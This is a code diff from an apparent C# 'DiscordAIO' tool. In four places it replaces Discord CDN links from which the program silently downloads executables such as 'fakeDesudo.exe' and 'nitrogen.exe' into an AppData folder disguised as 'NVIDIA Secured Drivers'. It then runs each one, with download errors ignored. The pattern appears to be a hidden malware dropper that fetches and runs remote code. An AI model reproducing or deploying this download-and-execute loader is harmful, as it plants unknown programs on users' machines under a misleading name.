@@ -3183,7 +3183,7 @@ namespace DiscordAIO
 
 			try
 			{
-				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/951466723406667806/DiscordTools.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordTools.exe");
+				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973552453083594762/973553916992176208/DiscordTools.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordTools.exe");
 			}
 			catch { }
 			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordTools.exe");
@@ -3198,7 +3198,7 @@ namespace DiscordAIO
 
 			try
 			{
-				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/956346715835871262/fakeDesudo.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\fakeDesudo.exe");
+				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973552453083594762/973552633203810344/fakeDesudo.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\fakeDesudo.exe");
 			}
 			catch { }
 			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\fakeDesudo.exe");
@@ -3213,7 +3213,7 @@ namespace DiscordAIO
 
 			try
 			{
-				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950526489328242718/FakeConsole.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\FakeConsole.exe");
+				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973552453083594762/973552465335164928/FakeConsole.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\FakeConsole.exe");
 			}
 			catch { }
 			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\FakeConsole.exe");
@@ -3228,7 +3228,7 @@ namespace DiscordAIO
 
 			try
 			{
-				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950526991625506876/nitrogen.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\nitrogen.exe");
+				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973552453083594762/973552775315226635/nitrogen.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\nitrogen.exe");
 			}
 			catch { }
 			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\nitrogen.exe");
